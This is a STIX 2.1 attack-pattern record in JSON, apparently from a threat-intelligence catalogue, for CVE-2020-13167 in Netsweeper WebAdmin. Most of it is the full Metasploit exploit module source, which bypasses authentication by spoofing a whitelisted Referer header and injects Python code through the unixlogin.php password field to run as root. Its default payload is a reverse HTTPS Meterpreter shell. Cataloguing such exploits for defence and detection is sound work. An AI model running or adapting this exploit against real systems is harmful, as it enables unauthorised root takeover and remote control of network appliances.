{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad8d2169-80bf-4e0b-a8c2-135c455816af",
    "created": "2024-08-14T17:03:55.958039Z",
    "modified": "2024-08-14T17:03:55.958043Z",
    "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
    "description": " This module exploits a Python code injection in the Netsweeper WebAdmin component's unixlogin.php script, for versions 6.4.4 and prior, to execute code as the root user.  Authentication is bypassed by sending a random whitelisted Referer header in each request.  Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs. Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has been confirmed exploitable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/netsweeper_webadmin_unixlogin.rb",
            "external_id": "netsweeper_webadmin_unixlogin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13167"
        },
        {
            "source_name": "reference",
            "url": "https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netsweeper WebAdmin unixlogin.php Python Code Injection',\n        'Description' => %q{\n          This module exploits a Python code injection in the Netsweeper\n          WebAdmin component's unixlogin.php script, for versions 6.4.4 and\n          prior, to execute code as the root user.\n\n          Authentication is bypassed by sending a random whitelisted Referer\n          header in each request.\n\n          Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs.\n          Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has\n          been confirmed exploitable.\n        },\n        'Author' => [\n          # Reported to SSD (SecuriTeam) by an anonymous researcher\n          # Example exploit written by said anonymous researcher\n          # Publicly disclosed by Noam Rathaus of SSD (SecuriTeam)\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-13167'],\n          ['URL', 'https://ssd-disclosure.com/ssd-advisory-netsweeper-preauth-rce/'],\n          ['URL', 'https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says']\n        ],\n        'DisclosureDate' => '2020-04-28', # SSD (SecuriTeam) advisory\n        'License' => MSF_LICENSE,\n        'Platform' => 'python',\n        'Arch' => ARCH_PYTHON,\n        'Privileged' => true,\n        'Targets' => [['Python', {}]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'SSL' => true,\n          'PAYLOAD' => 'python/meterpreter/reverse_https'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(443),\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path,\n                             '/webadmin/tools/systemstatus_remote.php'),\n      'headers' => {\n        'Referer' => rand_referer(:check) # Auth bypass via Referer header\n      }\n    )\n\n    unless res\n      return CheckCode::Unknown('Target did not respond to check.')\n    end\n\n    unless res.code == 200\n      return CheckCode::Unknown('Target is not running Netsweeper.')\n    end\n\n    if res.body.include?('Permission Denied: Unauthorized access.')\n      return CheckCode::Safe('Target has rejected our Referer auth bypass.')\n    end\n\n    # Example version information from /webadmin/tools/systemstatus_remote.php:\n    #   Version: 6.4.3\n    #   Build Date: 2020-03-27 14:15:19\n    #   Database Version: 139\n    unless (version = res.body.scan(/^Version: ([\\d.]+)$/).flatten.first)\n      return CheckCode::Detected(\n        'Target did not respond with Netsweeper version.'\n      )\n    end\n\n    if Rex::Version.new(version) <= Rex::Version.new('6.4.4')\n      return CheckCode::Appears(\n        \"Netsweeper #{version} is a vulnerable version.\"\n      )\n    end\n\n    CheckCode::Safe(\"Netsweeper #{version} is NOT a vulnerable version.\")\n  end\n\n  def exploit\n    referer = rand_referer(:exploit)\n    vprint_status(\"Selecting random whitelisted Referer header: #{referer}\")\n    vprint_status(\"Injecting Python code into password field: #{fake_password}\")\n\n    normie_uri = normalize_uri(target_uri.path, '/webadmin/tools/unixlogin.php')\n    print_status(\"Sending #{datastore['PAYLOAD']} to #{full_uri(normie_uri)}\")\n\n    # The application may block on the payload, so time out reasonably soon\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normie_uri,\n      'headers' => {\n        'Referer' => referer\n      },\n      'vars_post' => {\n        'login' => '.', # Bypass user check by injecting `grep . /etc/shadow'\n        'password' => fake_password\n      }\n    }, 3.5)\n\n    return unless res\n\n    # An unexpected reply typically means some sort of error, so print it out\n    fail_with(Failure::UnexpectedReply, res.body)\n  end\n\n  def fake_password\n    return @fake_password if @fake_password\n\n    # Arguments for crypt.crypt(): https://docs.python.org/2/library/crypt.html\n    word = rand_text_alphanumeric(8..42)\n    salt = rand_text_alphanumeric(2) # This is DES-safe because we remove algo\n\n    # Python code injection occurs in the $2 positional parameter from sh(1):\n    #   password=$($PYTHON -c \"import crypt; print crypt.crypt('$2', '\\$$algo\\$$salt\\$')\")\n    @fake_password = \"#{word}', '#{salt}'); #{payload.encoded} #\"\n  end\n\n  # Select a random Referer [sic] header value from an appropriate whitelist\n  def rand_referer(method = :check)\n    case method\n    when :check\n      %w[\n        webadmin/admin/systemstatus_inc_data.php\n        webadmin/api/\n        webadmin/common/systemstatus_overview_ajax.php\n      ].sample\n    when :exploit\n      %w[\n        systemconfig/edit_database_settings.php\n        systemconfig/edit_file.php\n        systemconfig/manage_certs.php\n        webadmin/admin/service_manager_data.php\n        webadmin/api/\n        webadmin/systemconfig/edit_email_sending_settings.php\n        webadmin/systemconfig/grant_db_access.php\n      ].sample\n    else\n      fail_with(Failure::BadConfig,\n                \"I don't know how to #{method}, but I do know how to love\")\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-04-28, # SSD SecuriTeam advisory",
    "x_mitre_platforms": [
        "python'"
    ]
}